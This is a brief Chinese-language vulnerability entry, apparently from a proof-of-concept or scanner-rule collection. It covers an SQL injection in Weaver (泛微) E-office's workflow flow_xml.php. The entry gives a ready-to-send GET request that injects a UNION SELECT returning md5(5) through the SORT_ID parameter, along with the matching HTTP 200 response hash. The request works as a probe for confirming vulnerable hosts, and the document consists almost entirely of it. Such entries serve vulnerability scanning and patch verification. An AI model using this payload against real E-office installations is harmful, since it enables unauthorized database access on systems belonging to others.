# 泛微E-officeflow_xml.php存在SQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **请求**：`GET /general/system/workflow/flow_type/flow_xml.php?SORT_ID=1%20union%20select%201,(md5(5)),3,4,5,6,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 HTTP/1.1`
- **响应特征**：200 e4da3b7fbbce2345d7772b0674a318d5